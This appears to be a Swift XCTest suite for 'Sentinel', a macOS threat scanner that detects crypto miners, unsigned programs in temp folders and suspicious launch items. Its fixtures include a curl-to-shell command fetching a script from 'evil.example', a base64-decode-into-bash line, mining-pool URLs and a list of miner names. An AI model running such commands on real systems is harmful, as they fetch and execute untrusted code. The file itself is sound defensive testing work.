import XCTest
@testable import Sentinel

final class ThreatRulesTests: XCTestCase {
    private let home = NSHomeDirectory()

    private func proc(_ path: String, args: [String] = [], cpu: Double = 0, sustained: Int = 0,
                      sign: SignState = .unsigned, exists: Bool = true) -> ProcInfo {
        ProcInfo(pid: 123, path: path, args: args, cpu: cpu, sustainedScans: sustained, sign: sign, exists: exists)
    }

    // MARK: crypto miners

    func testMinerByNameIsHighRisk() {
        let f = ThreatRules.evaluate(proc("/tmp/x/xmrig"))
        XCTAssertEqual(f?.severity, .high)
        XCTAssertTrue(f?.reasons.first?.contains("xmrig") == true)
        for name in ["minerd", "cpuminer-multi", "NiceHash-Miner", "kdevtmpfsi", "t-rex", "lolMiner"] {
            XCTAssertEqual(ThreatRules.evaluate(proc("/Users/x/Downloads/\(name)"))?.severity, .high, name)
        }
    }

    func testMiningPoolArgumentsAreCaughtEvenInsideASystemFolder() {
        let p = proc("/bin/sh", args: ["sh", "-c", "sleep 99", "stratum+tcp://pool.example.com:3333"], cpu: 80, sign: .apple)
        XCTAssertEqual(ThreatRules.evaluate(p)?.severity, .high)
        XCTAssertEqual(ThreatRules.evaluate(proc("/usr/bin/python3", args: ["python3", "run.py", "--donate-level", "1"], cpu: 90, sign: .apple))?.severity, .high)
        // a program that is not an interpreter is flagged at once
        XCTAssertEqual(ThreatRules.evaluate(proc("/Users/x/bin/worker", args: ["worker", "-o", "stratum+tcp://p:1"]))?.severity, .high)
    }

    func testInterpreterRunningAMinerScript() {
        XCTAssertEqual(ThreatRules.evaluate(proc("/bin/bash", args: ["bash", "/tmp/.hidden/xmrig.sh"], cpu: 70, sign: .apple))?.severity, .high)
        XCTAssertEqual(ThreatRules.evaluate(proc("/bin/sh", args: ["sh", "-c", "xmrig -o pool:3333"], cpu: 70, sign: .apple))?.severity, .high)
    }

    /// Regression: a terminal shell whose command line merely contains miner words (a developer writing docs or tests)
    /// must not raise a HIGH RISK popup.
    func testAnIdleShellMentioningMinerWordsIsNotFlagged() {
        for exe in ["/bin/zsh", "/bin/bash", "/bin/sh", "/usr/bin/python3", "/opt/homebrew/bin/node"] {
            let p = proc(exe, args: [URL(fileURLWithPath: exe).lastPathComponent, "-c", "cat > docs.md <<EOF stratum+tcp://pool:3333 xmrig --donate-level 1 EOF"], cpu: 2, sign: .apple)
            XCTAssertNil(ThreatRules.evaluate(p), exe)
        }
        XCTAssertNil(ThreatRules.evaluate(proc("/bin/sh", args: ["sh", "xmrig.sh"], cpu: 1, sign: .apple)))
    }

    func testInterpreterDetection() {
        for p in ["/bin/zsh", "/bin/sh", "/usr/bin/python3", "/usr/bin/python3.12", "/opt/homebrew/bin/node", "/usr/bin/perl"] { XCTAssertTrue(ThreatRules.isInterpreter(p), p) }
        for p in ["/Users/x/bin/shellcheck", "/Users/x/bin/worker", "/usr/bin/grep", "/tmp/nodeminer"] { XCTAssertFalse(ThreatRules.isInterpreter(p), p) }
    }

    func testOrdinaryCommandsMentioningMinersAreNotFlagged() {
        XCTAssertNil(ThreatRules.evaluate(proc("/usr/bin/grep", args: ["grep", "-r", "xmrig", "."], sign: .apple)))
        XCTAssertNil(ThreatRules.evaluate(proc("/usr/bin/vim", args: ["vim", "notes.txt"], sign: .apple)))
    }

    func testDeletedExecutableIsHighRisk() {
        XCTAssertEqual(ThreatRules.evaluate(proc("/tmp/a/evil", exists: false))?.severity, .high)
        XCTAssertNil(ThreatRules.evaluate(proc("/usr/bin/gone", sign: .apple, exists: false)), "system paths are not judged on existence")
    }

    // MARK: heavy CPU and odd locations

    func testSustainedHeavyCPUFromAnUnidentifiedProgram() {
        let path = home + "/bin/thing"
        XCTAssertEqual(ThreatRules.evaluate(proc(path, cpu: 90, sustained: 3))?.severity, .medium)
        XCTAssertNil(ThreatRules.evaluate(proc(path, cpu: 90, sustained: 1)), "a short spike is normal")
        XCTAssertNil(ThreatRules.evaluate(proc(path, cpu: 40, sustained: 5)), "below the CPU bar")
        XCTAssertNil(ThreatRules.evaluate(proc(path, cpu: 90, sustained: 5, sign: .developer)), "identified developer")
    }

    func testDeveloperToolsAndAppsAreNotFlagged() {
        for path in ["/Applications/Foo.app/Contents/MacOS/Foo", "/opt/homebrew/bin/node", "/usr/local/bin/python3.12",
                     home + "/Library/Java/JavaVirtualMachines/jdk/bin/java", home + "/.gradle/daemon/java",
                     home + "/.konan/dependencies/llvm/bin/clang"] {
            XCTAssertNil(ThreatRules.evaluate(proc(path, cpu: 95, sustained: 10, sign: .adhoc)), path)
        }
    }

    func testAppleSystemProcessesAreTrusted() {
        XCTAssertNil(ThreatRules.evaluate(proc("/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder", cpu: 99, sustained: 20, sign: .apple)))
        XCTAssertNil(ThreatRules.evaluate(proc("/usr/libexec/syspolicyd", cpu: 99, sustained: 20, sign: .apple)))
    }

    func testUnsignedProgramInTempOrHiddenFolder() {
        XCTAssertEqual(ThreatRules.evaluate(proc("/tmp/payload", cpu: 30))?.severity, .medium)
        XCTAssertNil(ThreatRules.evaluate(proc("/tmp/payload", cpu: 5)), "idle programs in /tmp are normal")
        XCTAssertEqual(ThreatRules.evaluate(proc(home + "/.hidden/agent", cpu: 30))?.severity, .medium)
        XCTAssertNil(ThreatRules.evaluate(proc(home + "/.npm/_npx/tool", cpu: 30)), "known developer folder")
    }

    func testLocationHelpers() {
        XCTAssertTrue(ThreatRules.inSuspiciousLocation("/private/tmp/a"))
        XCTAssertTrue(ThreatRules.inSuspiciousLocation("/Users/Shared/a"))
        XCTAssertFalse(ThreatRules.inSuspiciousLocation("/Applications/A.app/Contents/MacOS/A"))
        XCTAssertFalse(ThreatRules.inSuspiciousLocation(home + "/Documents/tool"))
        XCTAssertTrue(ThreatRules.isApplePath("/usr/bin/ssh"))
        XCTAssertFalse(ThreatRules.isApplePath("/usr/local/bin/ssh"))
    }

    // MARK: persistence

    func testSuspiciousLaunchItems() {
        XCTAssertNotNil(ThreatRules.suspiciousLaunchItem(program: "/bin/sh", arguments: ["-c", "curl -s http://evil.example/a.sh | sh"]))
        XCTAssertNotNil(ThreatRules.suspiciousLaunchItem(program: "/tmp/agent", arguments: []))
        XCTAssertNotNil(ThreatRules.suspiciousLaunchItem(program: "/bin/bash", arguments: ["-c", "echo aGk= | base64 -d | bash"]))
        XCTAssertNotNil(ThreatRules.suspiciousLaunchItem(program: "/Users/x/.cache/xmrig", arguments: ["-o", "stratum+tcp://p:1"]))
    }

    func testNormalLaunchItemsAreLeftAlone() {
        XCTAssertNil(ThreatRules.suspiciousLaunchItem(program: "/Applications/Foo.app/Contents/MacOS/FooHelper", arguments: []))
        XCTAssertNil(ThreatRules.suspiciousLaunchItem(program: "/Library/PrivilegedHelperTools/com.docker.vmnetd", arguments: []))
        XCTAssertNil(ThreatRules.suspiciousLaunchItem(program: "/usr/bin/open", arguments: ["-a", "Foo"]))
        XCTAssertNil(ThreatRules.suspiciousLaunchItem(program: nil, arguments: []))
    }
}

/// End-to-end: start harmless look-alikes and make sure the real scanner sees them.
final class ThreatScannerTests: XCTestCase {
    private func start(_ exe: String, _ args: [String]) throws -> Process {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: exe)
        p.arguments = args
        p.standardOutput = Pipe(); p.standardError = Pipe()
        try p.run()
        Thread.sleep(forTimeInterval: 0.4)
        return p
    }

    /// A harmless renamed copy of `sleep`. macOS refuses to run a copied system binary until it is re-signed.
    private func fakeProgram(named name: String, in sb: Sandbox) throws -> URL {
        let fake = sb.root.appendingPathComponent(name)
        try FileManager.default.copyItem(atPath: "/bin/sleep", toPath: fake.path)
        let sign = Process()
        sign.executableURL = URL(fileURLWithPath: "/usr/bin/codesign")
        sign.arguments = ["--force", "--sign", "-", fake.path]
        sign.standardOutput = Pipe(); sign.standardError = Pipe()
        try sign.run(); sign.waitUntilExit()
        return fake
    }

    func testFindsAFakeMinerByItsName() throws {
        let sb = Sandbox()
        let fake = try fakeProgram(named: "xmrig", in: sb)
        let p = try start(fake.path, ["30"])
        defer { p.terminate() }
        let result = ThreatScanner().scan(allowed: [])
        let hit = result.threats.first { $0.pids.contains(p.processIdentifier) }
        XCTAssertNotNil(hit, "the scanner must report the fake miner")
        XCTAssertEqual(hit?.severity, .high)
        XCTAssertFalse(hit?.isPersistence ?? true)
    }

    func testFindsPoolArgumentsOnAnInnocentProcess() throws {
        // a busy loop, like a miner: pool text in an interpreter only counts when it is working hard
        let p = try start("/bin/sh", ["-c", "while :; do :; done", "stratum+tcp://pool.example.com:3333"])
        defer { p.terminate() }
        let scanner = ThreatScanner()
        _ = scanner.scan(allowed: [])
        Thread.sleep(forTimeInterval: 1.0)
        let hit = scanner.scan(allowed: []).threats.first { $0.pids.contains(p.processIdentifier) }
        XCTAssertEqual(hit?.severity, .high)
    }

    func testAnIdleShellWithPoolTextIsLeftAlone() throws {
        let p = try start("/bin/sh", ["-c", "sleep 30; true", "stratum+tcp://pool.example.com:3333"])
        defer { p.terminate() }
        let scanner = ThreatScanner()
        _ = scanner.scan(allowed: [])
        Thread.sleep(forTimeInterval: 0.5)
        XCTAssertNil(scanner.scan(allowed: []).threats.first { $0.pids.contains(p.processIdentifier) })
    }

    func testFindsAShellScriptNamedLikeAMiner() throws {
        let sb = Sandbox()
        let script = sb.file("xmrig.sh", bytes: 0)
        try "#!/bin/sh\nwhile :; do :; done\n".write(to: script, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: script.path)
        let p = try start(script.path, [])
        defer { p.terminate() }
        let scanner = ThreatScanner()
        _ = scanner.scan(allowed: [])
        Thread.sleep(forTimeInterval: 1.0)
        let hit = scanner.scan(allowed: []).threats.first { $0.pids.contains(p.processIdentifier) }
        XCTAssertEqual(hit?.severity, .high)
    }

    func testAllowedProgramsAreSkipped() throws {
        let sb = Sandbox()
        let fake = try fakeProgram(named: "xmrig", in: sb)
        let p = try start(fake.path, ["30"])
        defer { p.terminate() }
        // the scanner sees the real path (/private/var/…), which is what the allow list stores in real use
        var real = fake.path
        if let r = realpath(fake.path, nil) { real = String(cString: r); free(r) }
        let result = ThreatScanner().scan(allowed: [real])
        XCTAssertNil(result.threats.first { $0.pids.contains(p.processIdentifier) })
    }

    func testReadsArgumentsOfARunningProcess() throws {
        let p = try start("/bin/sleep", ["30"])
        defer { p.terminate() }
        XCTAssertEqual(ThreatScanner().readArgs(p.processIdentifier), ["/bin/sleep", "30"])
    }

    func testNoHighRiskFindingsOnARegularMac() {
        let scanner = ThreatScanner()
        _ = scanner.scan(allowed: [])
        Thread.sleep(forTimeInterval: 0.3)
        let r = scanner.scan(allowed: [])
        // Shells are skipped here: a developer's own terminal command can mention miner names (this test file does).
        let shells: Set<String> = ["/bin/zsh", "/bin/bash", "/bin/sh"]
        let high = r.threats.filter { $0.severity == .high && !shells.contains($0.path) }
        XCTAssertTrue(high.isEmpty, "unexpected high-risk finding: \(high.map { $0.path })")
    }

    func testSignatureStates() {
        let s = ThreatScanner()
        XCTAssertEqual(s.signState("/bin/ls"), .apple)
        XCTAssertEqual(s.signState("/nonexistent/\(UUID().uuidString)"), .unknown)
        if FileManager.default.fileExists(atPath: "/Applications/Safari.app") || FileManager.default.fileExists(atPath: "/Applications/Google Chrome.app") {
            let app = FileManager.default.fileExists(atPath: "/Applications/Google Chrome.app") ? "/Applications/Google Chrome.app" : "/Applications/Safari.app"
            XCTAssertTrue([.developer, .apple].contains(s.signState(app)), "a signed app must not look unsigned")
        }
    }
}
